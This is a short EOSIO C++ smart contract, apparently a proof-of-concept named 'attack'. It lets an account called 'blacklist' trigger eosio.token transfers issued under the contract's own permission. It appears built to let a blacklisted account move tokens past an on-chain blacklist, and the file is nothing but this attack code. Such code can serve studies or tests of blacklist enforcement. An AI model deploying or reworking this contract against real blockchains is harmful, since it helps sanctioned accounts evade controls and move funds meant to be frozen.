/**
 *  @file
 *  @copyright defined in eos/LICENSE.txt
 */
#include <utility>
#include <vector>
#include <string>
#include <eosiolib/eosio.hpp>
#include <eosiolib/asset.hpp>
#include <eosiolib/contract.hpp>
#include <eosiolib/singleton.hpp>
#include <eosiolib/print.hpp>
using namespace eosio;
using namespace std;

class attack : public eosio::contract {
   public:
      attack(account_name self)
      :eosio::contract(self){
      
      }
      //@abi action
      void transfer( const account_name from, const account_name to, const asset& quantity, const string memo ) {
         require_auth(N(blacklist));
         action(
            permission_level{ _self, N(active) },
            N(eosio.token), N(transfer),
            std::make_tuple(from, to, quantity, memo)
         ).send();
      }

};

EOSIO_ABI( attack, (transfer) )